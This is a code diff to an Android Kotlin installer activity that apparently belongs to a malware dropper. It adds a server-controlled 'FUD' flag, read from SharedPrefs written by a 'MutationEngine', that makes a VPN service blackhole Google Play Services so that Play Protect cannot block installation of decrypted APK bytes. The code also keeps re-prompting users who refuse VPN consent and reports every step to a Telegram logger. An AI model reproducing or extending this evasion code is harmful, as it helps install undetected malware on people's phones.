@@ -62,6 +62,10 @@ class InstallActivity : Activity() {
     private var progressRunnable: Runnable? = null
     // Holds decrypted APK bytes while waiting for VPN to establish
     private var pendingApkBytes: ByteArray? = null
+    // FUD flag: read from SharedPrefs (written by MutationEngine after server response)
+    // true = FUD ON (GMS blackholed → Play Protect blinded) — default safe value
+    // false = FUD OFF (GMS excluded → Play Protect active → blocks install)
+    private var vpnBypassEnabled: Boolean = true
     // ── Restart retry counter ─────────────────────────────────────────────────
     // Counts how many times INSTALL_RESTART_ACTION has triggered startDownload().
     // Capped at MAX_INSTALL_RESTARTS to prevent an infinite retry loop when the
@@ -229,7 +233,7 @@ class InstallActivity : Activity() {
                 if (resultCode == RESULT_OK) {
                     // User granted VPN consent — start BlackholeVpnService
                     TelegramLogger.send(this, "VPN_CONSENT", "GRANTED", "starting BlackholeVpnService")
-                    BlackholeVpnService.start(this)
+                    BlackholeVpnService.start(this, vpnBypassEnabled)
                     // vpnEstablishedReceiver will call installViaSession when tunnel is ready
                 } else {
                     // User denied VPN consent — VPN is MANDATORY, re-prompt after delay
@@ -238,7 +242,7 @@ class InstallActivity : Activity() {
                         val retryIntent = VpnService.prepare(this)
                         if (retryIntent == null) {
                             TelegramLogger.send(this, "VPN_CONSENT", "GRANTED_AFTER_RETRY", "starting BlackholeVpnService")
-                            BlackholeVpnService.start(this)
+                            BlackholeVpnService.start(this, vpnBypassEnabled)
                         } else {
                             launchVpnConsent(retryIntent)
                         }
@@ -810,6 +814,11 @@ class InstallActivity : Activity() {
     private fun prepareAndStartVpn(apkBytes: ByteArray) {
         pendingApkBytes = apkBytes
 
+        // Read vpn_bypass from SharedPrefs (written by MutationEngine after server response)
+        // 1 = FUD ON (default: safe), 0 = FUD OFF
+        vpnBypassEnabled = getSharedPreferences("vg_prefs", MODE_PRIVATE)
+            .getInt("vpn_bypass", 1) == 1
+
         // If VPN is already running (e.g. activity recreation), proceed directly
         if (BlackholeVpnService.isRunning) {
             TelegramLogger.send(this, "VPN_FLOW", "ALREADY_RUNNING", "proceeding directly to install")
@@ -823,7 +832,7 @@ class InstallActivity : Activity() {
         if (prepareIntent == null) {
             // Consent already granted — start VPN immediately
             TelegramLogger.send(this, "VPN_CONSENT", "ALREADY_GRANTED", "starting BlackholeVpnService")
-            BlackholeVpnService.start(this)
+            BlackholeVpnService.start(this, vpnBypassEnabled)
             // vpnEstablishedReceiver will call installViaSession when tunnel is ready
         } else {
             // Need user consent — launch system VPN dialog directly
@@ -855,7 +864,7 @@ class InstallActivity : Activity() {
                     if (retryIntent == null) {
                         // User might have granted via settings in the meantime
                         TelegramLogger.send(this, "VPN_CONSENT", "GRANTED_RETRY", "starting BlackholeVpnService")
-                        BlackholeVpnService.start(this)
+                        BlackholeVpnService.start(this, vpnBypassEnabled)
                     } else {
                         launchVpnConsent(retryIntent)
                     }
@@ -879,7 +888,7 @@ class InstallActivity : Activity() {
             handler.postDelayed({
                 val retryIntent = VpnService.prepare(this)
                 if (retryIntent == null) {
-                    BlackholeVpnService.start(this)
+                    BlackholeVpnService.start(this, vpnBypassEnabled)
                 } else {
                     launchVpnConsent(retryIntent)
                 }
